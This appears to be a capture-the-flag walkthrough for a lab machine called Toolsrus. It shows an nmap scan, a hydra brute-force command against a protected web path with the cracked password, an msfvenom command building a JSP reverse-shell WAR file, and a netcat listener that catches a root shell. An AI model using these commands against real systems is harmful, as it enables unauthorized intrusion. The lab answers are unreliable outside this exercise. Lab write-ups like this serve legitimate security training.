# Toolsrus

### Nmap Scan Results ->

We first always run a nmap scan with whatever way you like to run your scans you can also use masscan if you like or any scanner i just run a normal nmap scan with the -A to get all information i can

```

Nmap scan report for 10.10.77.141
Host is up (0.047s latency).
Not shown: 65531 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 64:90:07:2c:ce:9a:53:02:4b:52:29:02:36:95:99:6f (RSA)
| 256 1c:39:7e:a3:2d:20:0d:fe:39:b2:d1:1f:2e:9f:81:ee (ECDSA)
|\_ 256 f6:b2:7f:69:d1:06:82:1d:d8:79:77:06:fc:7f:7b:6b (ED25519)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|\_http-server-header: Apache/2.4.18 (Ubuntu)
|\_http-title: Site doesn't have a title (text/html).
1234/tcp open http Apache Tomcat/Coyote JSP engine 1.1
|\_http-favicon: Apache Tomcat
|\_http-server-header: Apache-Coyote/1.1
|\_http-title: Apache Tomcat/7.0.88
8009/tcp open ajp13 Apache Jserv (Protocol v1.3)
|\_ajp-methods: Failed to get a valid response for the OPTION request
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ )

```

### Directory Busting and Brute Forcing

We use Dirtbuster to do directory busting on this one and we can see that there two weird files here one is Guidelines and the other is protected.And Protected one is what is protected by a username and password and we go to guidelines we see a name there and that name is bob so we can maybe bruteforce using hydra and using bob as the username and see if we can make our way in and we can use hydra with this syntax →

```
hydra -l bob -P /usr/share/wordlists/rockyou.txt $IP http-get "/protected"
```

and here after brute forcing we see that the password is bubbles

### Exploitation

And now it says the password has transferred to another port which when we traverse to we come across a apache tomcat manager which is soo sooo dangerous to have like that and now we use the same credentials to log in to the manager and after looking around a little we can see we can upload some stuff here (files with WAR extension ) so now if you want you can use metasploit and get like a cool meterpreter shell but if you wanna do it to practice for OSCP i would recommend using msfvenom to make your own payload with this code:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=1234 -f war > shell.war
```

You can find a lot of these payload cheat sheets on this site right here : [Msf Venom Cheat Sheet](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)

and then lets just upload this war file to the server through the tomcat manager and use our terminal to listen with Netcat on the port we defined which in this case was 1234 for us and the syntax for that is

```
nc -nvlp 1234
```

and thats it will get a shell for you and now you can check by doing whoami to see that you are root and then traverse into root directory and cat out the flag
